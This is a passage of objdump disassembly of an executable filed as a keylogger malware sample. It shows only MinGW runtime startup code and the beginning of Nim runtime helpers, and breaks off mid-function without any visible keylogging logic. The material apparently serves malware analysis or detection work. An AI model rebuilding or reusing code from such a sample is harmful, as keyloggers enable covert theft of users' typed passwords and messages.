
malware_samples/keylogger/3c93800b31bf6c2897ce2d8ce363c33f3a9cf468adfaa5b0c507de6084970b49.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <__mingw_invalidParameterHandler>:
  401000:	c3                   	ret
  401001:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40100d:	00 00 00 

0000000000401010 <pre_c_init>:
  401010:	48 83 ec 28          	sub    $0x28,%rsp
  401014:	48 8b 05 c5 0d 01 00 	mov    0x10dc5(%rip),%rax        # 411de0 <.refptr.mingw_initltsdrot_force>
  40101b:	31 d2                	xor    %edx,%edx
  40101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401023:	48 8b 05 c6 0d 01 00 	mov    0x10dc6(%rip),%rax        # 411df0 <.refptr.mingw_initltsdyn_force>
  40102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401030:	48 8b 05 c9 0d 01 00 	mov    0x10dc9(%rip),%rax        # 411e00 <.refptr.mingw_initltssuo_force>
  401037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40103d:	48 8b 05 8c 0d 01 00 	mov    0x10d8c(%rip),%rax        # 411dd0 <.refptr.mingw_initcharmax>
  401044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40104a:	48 8b 05 6f 0c 01 00 	mov    0x10c6f(%rip),%rax        # 411cc0 <.refptr.__image_base__>
  401051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
  401056:	74 58                	je     4010b0 <pre_c_init+0xa0>
  401058:	48 8b 05 61 0d 01 00 	mov    0x10d61(%rip),%rax        # 411dc0 <.refptr.mingw_app_type>
  40105f:	89 15 a3 2f 01 00    	mov    %edx,0x12fa3(%rip)        # 414008 <managedapp>
  401065:	8b 00                	mov    (%rax),%eax
  401067:	85 c0                	test   %eax,%eax
  401069:	74 35                	je     4010a0 <pre_c_init+0x90>
  40106b:	b9 02 00 00 00       	mov    $0x2,%ecx
  401070:	e8 03 74 00 00       	call   408478 <__set_app_type>
  401075:	e8 76 74 00 00       	call   4084f0 <__p__fmode>
  40107a:	48 8b 15 ff 0c 01 00 	mov    0x10cff(%rip),%rdx        # 411d80 <.refptr._fmode>
  401081:	8b 12                	mov    (%rdx),%edx
  401083:	89 10                	mov    %edx,(%rax)
  401085:	e8 46 5f 00 00       	call   406fd0 <_setargv>
  40108a:	48 8b 05 df 0b 01 00 	mov    0x10bdf(%rip),%rax        # 411c70 <.refptr._MINGW_INSTALL_DEBUG_MATHERR>
  401091:	83 38 01             	cmpl   $0x1,(%rax)
  401094:	74 5a                	je     4010f0 <pre_c_init+0xe0>
  401096:	31 c0                	xor    %eax,%eax
  401098:	48 83 c4 28          	add    $0x28,%rsp
  40109c:	c3                   	ret
  40109d:	0f 1f 00             	nopl   (%rax)
  4010a0:	b9 01 00 00 00       	mov    $0x1,%ecx
  4010a5:	e8 ce 73 00 00       	call   408478 <__set_app_type>
  4010aa:	eb c9                	jmp    401075 <pre_c_init+0x65>
  4010ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4010b0:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
  4010b4:	48 01 c8             	add    %rcx,%rax
  4010b7:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
  4010bd:	75 99                	jne    401058 <pre_c_init+0x48>
  4010bf:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
  4010c3:	66 81 f9 0b 01       	cmp    $0x10b,%cx
  4010c8:	74 39                	je     401103 <pre_c_init+0xf3>
  4010ca:	66 81 f9 0b 02       	cmp    $0x20b,%cx
  4010cf:	75 87                	jne    401058 <pre_c_init+0x48>
  4010d1:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
  4010d8:	0f 86 7a ff ff ff    	jbe    401058 <pre_c_init+0x48>
  4010de:	8b 88 f8 00 00 00    	mov    0xf8(%rax),%ecx
  4010e4:	31 d2                	xor    %edx,%edx
  4010e6:	85 c9                	test   %ecx,%ecx
  4010e8:	0f 95 c2             	setne  %dl
  4010eb:	e9 68 ff ff ff       	jmp    401058 <pre_c_init+0x48>
  4010f0:	48 8d 0d e9 61 00 00 	lea    0x61e9(%rip),%rcx        # 4072e0 <_matherr>
  4010f7:	e8 d4 61 00 00       	call   4072d0 <__mingw_setusermatherr>
  4010fc:	31 c0                	xor    %eax,%eax
  4010fe:	48 83 c4 28          	add    $0x28,%rsp
  401102:	c3                   	ret
  401103:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
  401107:	0f 86 4b ff ff ff    	jbe    401058 <pre_c_init+0x48>
  40110d:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
  401114:	31 d2                	xor    %edx,%edx
  401116:	45 85 c0             	test   %r8d,%r8d
  401119:	0f 95 c2             	setne  %dl
  40111c:	e9 37 ff ff ff       	jmp    401058 <pre_c_init+0x48>
  401121:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40112d:	00 00 00 

0000000000401130 <pre_cpp_init>:
  401130:	48 83 ec 38          	sub    $0x38,%rsp
  401134:	48 8b 05 75 0c 01 00 	mov    0x10c75(%rip),%rax        # 411db0 <.refptr._newmode>
  40113b:	4c 8d 05 ce 2e 01 00 	lea    0x12ece(%rip),%r8        # 414010 <envp>
  401142:	48 8d 15 cf 2e 01 00 	lea    0x12ecf(%rip),%rdx        # 414018 <argv>
  401149:	48 8d 0d d0 2e 01 00 	lea    0x12ed0(%rip),%rcx        # 414020 <argc>
  401150:	8b 00                	mov    (%rax),%eax
  401152:	89 05 a8 2e 01 00    	mov    %eax,0x12ea8(%rip)        # 414000 <__bss_start__>
  401158:	48 8d 05 a1 2e 01 00 	lea    0x12ea1(%rip),%rax        # 414000 <__bss_start__>
  40115f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401164:	48 8b 05 05 0c 01 00 	mov    0x10c05(%rip),%rax        # 411d70 <.refptr._dowildcard>
  40116b:	44 8b 08             	mov    (%rax),%r9d
  40116e:	e8 15 73 00 00       	call   408488 <__getmainargs>
  401173:	90                   	nop
  401174:	48 83 c4 38          	add    $0x38,%rsp
  401178:	c3                   	ret
  401179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401180 <__tmainCRTStartup>:
  401180:	41 55                	push   %r13
  401182:	41 54                	push   %r12
  401184:	55                   	push   %rbp
  401185:	57                   	push   %rdi
  401186:	56                   	push   %rsi
  401187:	53                   	push   %rbx
  401188:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  40118f:	31 c0                	xor    %eax,%eax
  401191:	b9 0d 00 00 00       	mov    $0xd,%ecx
  401196:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  40119b:	48 89 d7             	mov    %rdx,%rdi
  40119e:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a1:	48 8b 3d 18 0c 01 00 	mov    0x10c18(%rip),%rdi        # 411dc0 <.refptr.mingw_app_type>
  4011a8:	44 8b 0f             	mov    (%rdi),%r9d
  4011ab:	45 85 c9             	test   %r9d,%r9d
  4011ae:	0f 85 bc 02 00 00    	jne    401470 <__tmainCRTStartup+0x2f0>
  4011b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011bb:	00 00 
  4011bd:	48 8b 1d 4c 0b 01 00 	mov    0x10b4c(%rip),%rbx        # 411d10 <.refptr.__native_startup_lock>
  4011c4:	31 ed                	xor    %ebp,%ebp
  4011c6:	48 8b 70 08          	mov    0x8(%rax),%rsi
  4011ca:	4c 8b 25 33 71 04 00 	mov    0x47133(%rip),%r12        # 448304 <__imp_Sleep>
  4011d1:	eb 11                	jmp    4011e4 <__tmainCRTStartup+0x64>
  4011d3:	48 39 c6             	cmp    %rax,%rsi
  4011d6:	0f 84 34 02 00 00    	je     401410 <__tmainCRTStartup+0x290>
  4011dc:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011e1:	41 ff d4             	call   *%r12
  4011e4:	48 89 e8             	mov    %rbp,%rax
  4011e7:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
  4011ec:	48 85 c0             	test   %rax,%rax
  4011ef:	75 e2                	jne    4011d3 <__tmainCRTStartup+0x53>
  4011f1:	48 8b 35 28 0b 01 00 	mov    0x10b28(%rip),%rsi        # 411d20 <.refptr.__native_startup_state>
  4011f8:	31 ed                	xor    %ebp,%ebp
  4011fa:	8b 06                	mov    (%rsi),%eax
  4011fc:	83 f8 01             	cmp    $0x1,%eax
  4011ff:	0f 84 22 02 00 00    	je     401427 <__tmainCRTStartup+0x2a7>
  401205:	8b 06                	mov    (%rsi),%eax
  401207:	85 c0                	test   %eax,%eax
  401209:	0f 84 71 02 00 00    	je     401480 <__tmainCRTStartup+0x300>
  40120f:	c7 05 eb 2d 01 00 01 	movl   $0x1,0x12deb(%rip)        # 414004 <has_cctor>
  401216:	00 00 00 
  401219:	8b 06                	mov    (%rsi),%eax
  40121b:	83 f8 01             	cmp    $0x1,%eax
  40121e:	0f 84 18 02 00 00    	je     40143c <__tmainCRTStartup+0x2bc>
  401224:	85 ed                	test   %ebp,%ebp
  401226:	0f 84 31 02 00 00    	je     40145d <__tmainCRTStartup+0x2dd>
  40122c:	48 8b 05 7d 0a 01 00 	mov    0x10a7d(%rip),%rax        # 411cb0 <.refptr.__dyn_tls_init_callback>
  401233:	48 8b 00             	mov    (%rax),%rax
  401236:	48 85 c0             	test   %rax,%rax
  401239:	74 0c                	je     401247 <__tmainCRTStartup+0xc7>
  40123b:	45 31 c0             	xor    %r8d,%r8d
  40123e:	ba 02 00 00 00       	mov    $0x2,%edx
  401243:	31 c9                	xor    %ecx,%ecx
  401245:	ff d0                	call   *%rax
  401247:	e8 94 63 00 00       	call   4075e0 <_pei386_runtime_relocator>
  40124c:	48 8d 0d dd 68 00 00 	lea    0x68dd(%rip),%rcx        # 407b30 <_gnu_exception_handler>
  401253:	ff 15 a3 70 04 00    	call   *0x470a3(%rip)        # 4482fc <__imp_SetUnhandledExceptionFilter>
  401259:	48 8b 15 a0 0a 01 00 	mov    0x10aa0(%rip),%rdx        # 411d00 <.refptr.__mingw_oldexcpt_handler>
  401260:	48 89 02             	mov    %rax,(%rdx)
  401263:	e8 d8 67 00 00       	call   407a40 <__mingw_init_ehandler>
  401268:	48 8d 0d 91 fd ff ff 	lea    -0x26f(%rip),%rcx        # 401000 <__mingw_invalidParameterHandler>
  40126f:	e8 5c 72 00 00       	call   4084d0 <_set_invalid_parameter_handler>
  401274:	e8 67 61 00 00       	call   4073e0 <_fpreset>
  401279:	48 8b 05 40 0a 01 00 	mov    0x10a40(%rip),%rax        # 411cc0 <.refptr.__image_base__>
  401280:	48 89 05 e1 d8 02 00 	mov    %rax,0x2d8e1(%rip)        # 42eb68 <__mingw_winmain_hInstance>
  401287:	e8 54 72 00 00       	call   4084e0 <__p__acmdln>
  40128c:	31 c9                	xor    %ecx,%ecx
  40128e:	48 8b 00             	mov    (%rax),%rax
  401291:	48 85 c0             	test   %rax,%rax
  401294:	75 1c                	jne    4012b2 <__tmainCRTStartup+0x132>
  401296:	eb 5f                	jmp    4012f7 <__tmainCRTStartup+0x177>
  401298:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40129f:	00 
  4012a0:	84 d2                	test   %dl,%dl
  4012a2:	74 2c                	je     4012d0 <__tmainCRTStartup+0x150>
  4012a4:	83 e1 01             	and    $0x1,%ecx
  4012a7:	74 27                	je     4012d0 <__tmainCRTStartup+0x150>
  4012a9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012ae:	48 83 c0 01          	add    $0x1,%rax
  4012b2:	0f b6 10             	movzbl (%rax),%edx
  4012b5:	80 fa 20             	cmp    $0x20,%dl
  4012b8:	7e e6                	jle    4012a0 <__tmainCRTStartup+0x120>
  4012ba:	41 89 c8             	mov    %ecx,%r8d
  4012bd:	41 83 f0 01          	xor    $0x1,%r8d
  4012c1:	80 fa 22             	cmp    $0x22,%dl
  4012c4:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012c8:	eb e4                	jmp    4012ae <__tmainCRTStartup+0x12e>
  4012ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	75 11                	jne    4012e5 <__tmainCRTStartup+0x165>
  4012d4:	eb 1a                	jmp    4012f0 <__tmainCRTStartup+0x170>
  4012d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4012dd:	00 00 00 
  4012e0:	80 fa 20             	cmp    $0x20,%dl
  4012e3:	7f 0b                	jg     4012f0 <__tmainCRTStartup+0x170>
  4012e5:	48 83 c0 01          	add    $0x1,%rax
  4012e9:	0f b6 10             	movzbl (%rax),%edx
  4012ec:	84 d2                	test   %dl,%dl
  4012ee:	75 f0                	jne    4012e0 <__tmainCRTStartup+0x160>
  4012f0:	48 89 05 69 d8 02 00 	mov    %rax,0x2d869(%rip)        # 42eb60 <__mingw_winmain_lpCmdLine>
  4012f7:	44 8b 07             	mov    (%rdi),%r8d
  4012fa:	45 85 c0             	test   %r8d,%r8d
  4012fd:	74 16                	je     401315 <__tmainCRTStartup+0x195>
  4012ff:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401304:	b8 0a 00 00 00       	mov    $0xa,%eax
  401309:	0f 85 f1 00 00 00    	jne    401400 <__tmainCRTStartup+0x280>
  40130f:	89 05 eb 9c 00 00    	mov    %eax,0x9ceb(%rip)        # 40b000 <__data_start__>
  401315:	8b 1d 05 2d 01 00    	mov    0x12d05(%rip),%ebx        # 414020 <argc>
  40131b:	44 8d 63 01          	lea    0x1(%rbx),%r12d
  40131f:	4d 63 e4             	movslq %r12d,%r12
  401322:	49 c1 e4 03          	shl    $0x3,%r12
  401326:	4c 89 e1             	mov    %r12,%rcx
  401329:	e8 c2 70 00 00       	call   4083f0 <malloc>
  40132e:	85 db                	test   %ebx,%ebx
  401330:	48 8b 3d e1 2c 01 00 	mov    0x12ce1(%rip),%rdi        # 414018 <argv>
  401337:	48 89 c5             	mov    %rax,%rbp
  40133a:	7e 4b                	jle    401387 <__tmainCRTStartup+0x207>
  40133c:	8d 43 ff             	lea    -0x1(%rbx),%eax
  40133f:	31 db                	xor    %ebx,%ebx
  401341:	4c 8d 2c c5 08 00 00 	lea    0x8(,%rax,8),%r13
  401348:	00 
  401349:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401350:	48 8b 0c 1f          	mov    (%rdi,%rbx,1),%rcx
  401354:	e8 7f 70 00 00       	call   4083d8 <strlen>
  401359:	48 8d 70 01          	lea    0x1(%rax),%rsi
  40135d:	48 89 f1             	mov    %rsi,%rcx
  401360:	e8 8b 70 00 00       	call   4083f0 <malloc>
  401365:	49 89 f0             	mov    %rsi,%r8
  401368:	48 89 44 1d 00       	mov    %rax,0x0(%rbp,%rbx,1)
  40136d:	48 8b 14 1f          	mov    (%rdi,%rbx,1),%rdx
  401371:	48 89 c1             	mov    %rax,%rcx
  401374:	48 83 c3 08          	add    $0x8,%rbx
  401378:	e8 6b 70 00 00       	call   4083e8 <memcpy>
  40137d:	49 39 dd             	cmp    %rbx,%r13
  401380:	75 ce                	jne    401350 <__tmainCRTStartup+0x1d0>
  401382:	4a 8d 44 25 f8       	lea    -0x8(%rbp,%r12,1),%rax
  401387:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40138e:	48 89 2d 83 2c 01 00 	mov    %rbp,0x12c83(%rip)        # 414018 <argv>
  401395:	e8 06 5c 00 00       	call   406fa0 <__main>
  40139a:	48 8b 05 2f 09 01 00 	mov    0x1092f(%rip),%rax        # 411cd0 <.refptr.__imp___initenv>
  4013a1:	48 8b 15 68 2c 01 00 	mov    0x12c68(%rip),%rdx        # 414010 <envp>
  4013a8:	8b 0d 72 2c 01 00    	mov    0x12c72(%rip),%ecx        # 414020 <argc>
  4013ae:	48 8b 00             	mov    (%rax),%rax
  4013b1:	48 89 10             	mov    %rdx,(%rax)
  4013b4:	4c 8b 05 55 2c 01 00 	mov    0x12c55(%rip),%r8        # 414010 <envp>
  4013bb:	48 8b 15 56 2c 01 00 	mov    0x12c56(%rip),%rdx        # 414018 <argv>
  4013c2:	e8 69 72 00 00       	call   408630 <main>
  4013c7:	8b 0d 3b 2c 01 00    	mov    0x12c3b(%rip),%ecx        # 414008 <managedapp>
  4013cd:	89 05 39 2c 01 00    	mov    %eax,0x12c39(%rip)        # 41400c <mainret>
  4013d3:	85 c9                	test   %ecx,%ecx
  4013d5:	0f 84 c3 00 00 00    	je     40149e <__tmainCRTStartup+0x31e>
  4013db:	8b 15 23 2c 01 00    	mov    0x12c23(%rip),%edx        # 414004 <has_cctor>
  4013e1:	85 d2                	test   %edx,%edx
  4013e3:	75 0b                	jne    4013f0 <__tmainCRTStartup+0x270>
  4013e5:	e8 76 70 00 00       	call   408460 <_cexit>
  4013ea:	8b 05 1c 2c 01 00    	mov    0x12c1c(%rip),%eax        # 41400c <mainret>
  4013f0:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  4013f7:	5b                   	pop    %rbx
  4013f8:	5e                   	pop    %rsi
  4013f9:	5f                   	pop    %rdi
  4013fa:	5d                   	pop    %rbp
  4013fb:	41 5c                	pop    %r12
  4013fd:	41 5d                	pop    %r13
  4013ff:	c3                   	ret
  401400:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  401405:	e9 05 ff ff ff       	jmp    40130f <__tmainCRTStartup+0x18f>
  40140a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401410:	48 8b 35 09 09 01 00 	mov    0x10909(%rip),%rsi        # 411d20 <.refptr.__native_startup_state>
  401417:	bd 01 00 00 00       	mov    $0x1,%ebp
  40141c:	8b 06                	mov    (%rsi),%eax
  40141e:	83 f8 01             	cmp    $0x1,%eax
  401421:	0f 85 de fd ff ff    	jne    401205 <__tmainCRTStartup+0x85>
  401427:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  40142c:	e8 37 70 00 00       	call   408468 <_amsg_exit>
  401431:	8b 06                	mov    (%rsi),%eax
  401433:	83 f8 01             	cmp    $0x1,%eax
  401436:	0f 85 e8 fd ff ff    	jne    401224 <__tmainCRTStartup+0xa4>
  40143c:	48 8b 15 fd 08 01 00 	mov    0x108fd(%rip),%rdx        # 411d40 <.refptr.__xc_z>
  401443:	48 8b 0d e6 08 01 00 	mov    0x108e6(%rip),%rcx        # 411d30 <.refptr.__xc_a>
  40144a:	e8 01 70 00 00       	call   408450 <_initterm>
  40144f:	85 ed                	test   %ebp,%ebp
  401451:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
  401457:	0f 85 cf fd ff ff    	jne    40122c <__tmainCRTStartup+0xac>
  40145d:	31 c0                	xor    %eax,%eax
  40145f:	48 87 03             	xchg   %rax,(%rbx)
  401462:	e9 c5 fd ff ff       	jmp    40122c <__tmainCRTStartup+0xac>
  401467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40146e:	00 00 
  401470:	48 89 d1             	mov    %rdx,%rcx
  401473:	ff 15 23 6e 04 00    	call   *0x46e23(%rip)        # 44829c <__imp_GetStartupInfoA>
  401479:	e9 36 fd ff ff       	jmp    4011b4 <__tmainCRTStartup+0x34>
  40147e:	66 90                	xchg   %ax,%ax
  401480:	48 8b 15 d9 08 01 00 	mov    0x108d9(%rip),%rdx        # 411d60 <.refptr.__xi_z>
  401487:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
  40148d:	48 8b 0d bc 08 01 00 	mov    0x108bc(%rip),%rcx        # 411d50 <.refptr.__xi_a>
  401494:	e8 b7 6f 00 00       	call   408450 <_initterm>
  401499:	e9 7b fd ff ff       	jmp    401219 <__tmainCRTStartup+0x99>
  40149e:	89 c1                	mov    %eax,%ecx
  4014a0:	e8 7b 6f 00 00       	call   408420 <exit>
  4014a5:	90                   	nop
  4014a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014ad:	00 00 00 

00000000004014b0 <WinMainCRTStartup>:
  4014b0:	48 83 ec 28          	sub    $0x28,%rsp

00000000004014b4 <.l_startw>:
  4014b4:	48 8b 05 05 09 01 00 	mov    0x10905(%rip),%rax        # 411dc0 <.refptr.mingw_app_type>
  4014bb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  4014c1:	e8 1a 5b 00 00       	call   406fe0 <__security_init_cookie>
  4014c6:	e8 b5 fc ff ff       	call   401180 <__tmainCRTStartup>
  4014cb:	90                   	nop

00000000004014cc <.l_endw>:
  4014cc:	90                   	nop
  4014cd:	48 83 c4 28          	add    $0x28,%rsp
  4014d1:	c3                   	ret
  4014d2:	0f 1f 40 00          	nopl   0x0(%rax)
  4014d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014dd:	00 00 00 

00000000004014e0 <mainCRTStartup>:
  4014e0:	48 83 ec 28          	sub    $0x28,%rsp

00000000004014e4 <.l_start>:
  4014e4:	48 8b 05 d5 08 01 00 	mov    0x108d5(%rip),%rax        # 411dc0 <.refptr.mingw_app_type>
  4014eb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  4014f1:	e8 ea 5a 00 00       	call   406fe0 <__security_init_cookie>
  4014f6:	e8 85 fc ff ff       	call   401180 <__tmainCRTStartup>
  4014fb:	90                   	nop

00000000004014fc <.l_end>:
  4014fc:	90                   	nop
  4014fd:	48 83 c4 28          	add    $0x28,%rsp
  401501:	c3                   	ret
  401502:	0f 1f 40 00          	nopl   0x0(%rax)
  401506:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40150d:	00 00 00 

0000000000401510 <atexit>:
  401510:	48 83 ec 28          	sub    $0x28,%rsp
  401514:	e8 2f 6f 00 00       	call   408448 <_onexit>
  401519:	48 85 c0             	test   %rax,%rax
  40151c:	0f 94 c0             	sete   %al
  40151f:	0f b6 c0             	movzbl %al,%eax
  401522:	f7 d8                	neg    %eax
  401524:	48 83 c4 28          	add    $0x28,%rsp
  401528:	c3                   	ret
  401529:	90                   	nop
  40152a:	90                   	nop
  40152b:	90                   	nop
  40152c:	90                   	nop
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop

0000000000401530 <__gcc_register_frame>:
  401530:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 401540 <__gcc_deregister_frame>
  401537:	e9 d4 ff ff ff       	jmp    401510 <atexit>
  40153c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401540 <__gcc_deregister_frame>:
  401540:	c3                   	ret
  401541:	90                   	nop
  401542:	90                   	nop
  401543:	90                   	nop
  401544:	90                   	nop
  401545:	90                   	nop
  401546:	90                   	nop
  401547:	90                   	nop
  401548:	90                   	nop
  401549:	90                   	nop
  40154a:	90                   	nop
  40154b:	90                   	nop
  40154c:	90                   	nop
  40154d:	90                   	nop
  40154e:	90                   	nop
  40154f:	90                   	nop

0000000000401550 <Marker_tyRef__4HwedE75WPfqZSQ0Cq2OUg>:
  401550:	c3                   	ret

0000000000401551 <nimToCStringConv.lto_priv.53>:
  401551:	48 8d 05 a8 aa 00 00 	lea    0xaaa8(%rip),%rax        # 40c000 <.rdata>
  401558:	48 85 c9             	test   %rcx,%rcx
  40155b:	74 0a                	je     401567 <nimToCStringConv.lto_priv.53+0x16>
  40155d:	48 83 39 00          	cmpq   $0x0,(%rcx)
  401561:	74 04                	je     401567 <nimToCStringConv.lto_priv.53+0x16>
  401563:	48 8d 41 10          	lea    0x10(%rcx),%rax
  401567:	c3                   	ret

0000000000401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72>:
  401568:	48 85 c9             	test   %rcx,%rcx
  40156b:	74 08                	je     401575 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72+0xd>
  40156d:	48 83 39 00          	cmpq   $0x0,(%rcx)
  401571:	74 02                	je     401575 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72+0xd>
  401573:	eb dc                	jmp    401551 <nimToCStringConv.lto_priv.53>
  401575:	48 8d 05 85 aa 00 00 	lea    0xaa85(%rip),%rax        # 40c001 <.rdata+0x1>
  40157c:	c3                   	ret

000000000040157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>:
  40157d:	48 83 ec 68          	sub    $0x68,%rsp
  401581:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  401587:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
  40158c:	48 c7 02 00 00 00 00 	movq   $0x0,(%rdx)
  401593:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  40159a:	00 
  40159b:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  4015a0:	ba 06 00 00 c8       	mov    $0xc8000006,%edx
  4015a5:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
  4015ac:	00 00 
  4015ae:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  4015b5:	00 00 
  4015b7:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4015bc:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%rsp)
  4015c3:	00 
  4015c4:	ff 15 4e 86 02 00    	call   *0x2864e(%rip)        # 429c18 <Dl_14040067_>
  4015ca:	85 c0                	test   %eax,%eax
  4015cc:	0f 94 c0             	sete   %al
  4015cf:	48 83 c4 68          	add    $0x68,%rsp
  4015d3:	c3                   	ret

00000000004015d4 <Marker_tySequence__6H5Oh5UUvVCLiakt9aTwtUQ>:
  4015d4:	c3                   	ret

00000000004015d5 <Marker_tySequence__8Np6tlClE5az1CyqZdN19bQ>:
  4015d5:	c3                   	ret

00000000004015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>:
  4015d6:	48 ff 25 4b 86 02 00 	rex.W jmp *0x2864b(%rip)        # 429c28 <Dl_14036830_>

00000000004015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>:
  4015dd:	b8 04 00 00 00       	mov    $0x4,%eax
  4015e2:	48 85 c9             	test   %rcx,%rcx
  4015e5:	74 16                	je     4015fd <resize__cOCDWr16YD4j3dBrbbH3yQsystem+0x20>
  4015e7:	48 8d 04 49          	lea    (%rcx,%rcx,2),%rax
  4015eb:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
  4015ef:	48 d1 f8             	sar    $1,%rax
  4015f2:	48 81 f9 ff ff 00 00 	cmp    $0xffff,%rcx
  4015f9:	48 0f 4e c2          	cmovle %rdx,%rax
  4015fd:	c3                   	ret

00000000004015fe <stackSize__VOU3z9bbtHMYBiCVB5tMX1g>:
  4015fe:	48 83 ec 18          	sub    $0x18,%rsp
  401602:	48 c7 44 24 08 00 00 	movq   $0x0,0x8(%rsp)
  401609:	00 00 
  40160b:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
  401610:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  401615:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
  40161a:	31 c0                	xor    %eax,%eax
  40161c:	48 85 d2             	test   %rdx,%rdx
  40161f:	74 0b                	je     40162c <stackSize__VOU3z9bbtHMYBiCVB5tMX1g+0x2e>
  401621:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
  401626:	48 8b 01             	mov    (%rcx),%rax
  401629:	48 29 d0             	sub    %rdx,%rax
  40162c:	48 83 c4 18          	add    $0x18,%rsp
  401630:	c3                   	ret

0000000000401631 <Marker_tySequence__uB9b75OUPRENsBAu4AnoePA>:
  401631:	c3                   	ret

0000000000401632 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ>:
  401632:	4c 8b 49 08          	mov    0x8(%rcx),%r9
  401636:	48 8b 49 18          	mov    0x18(%rcx),%rcx
  40163a:	49 89 d0             	mov    %rdx,%r8
  40163d:	4d 21 c8             	and    %r9,%r8
  401640:	4a 8b 04 c1          	mov    (%rcx,%r8,8),%rax
  401644:	48 85 c0             	test   %rax,%rax
  401647:	74 12                	je     40165b <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ+0x29>
  401649:	48 39 50 08          	cmp    %rdx,0x8(%rax)
  40164d:	74 0c                	je     40165b <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ+0x29>
  40164f:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
  401653:	49 ff c0             	inc    %r8
  401656:	4d 21 c8             	and    %r9,%r8
  401659:	eb e5                	jmp    401640 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ+0xe>
  40165b:	c3                   	ret

000000000040165c <contains__ClLkUQKF8KrRxQPdAJDd5w>:
  40165c:	48 83 ec 28          	sub    $0x28,%rsp
  401660:	49 89 d2             	mov    %rdx,%r10
  401663:	48 c1 ea 0c          	shr    $0xc,%rdx
  401667:	e8 c6 ff ff ff       	call   401632 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ>
  40166c:	31 d2                	xor    %edx,%edx
  40166e:	48 85 c0             	test   %rax,%rax
  401671:	74 24                	je     401697 <contains__ClLkUQKF8KrRxQPdAJDd5w+0x3b>
  401673:	4c 89 d1             	mov    %r10,%rcx
  401676:	ba 01 00 00 00       	mov    $0x1,%edx
  40167b:	48 c1 e9 03          	shr    $0x3,%rcx
  40167f:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  401685:	49 89 c8             	mov    %rcx,%r8
  401688:	48 d3 e2             	shl    %cl,%rdx
  40168b:	49 c1 e8 06          	shr    $0x6,%r8
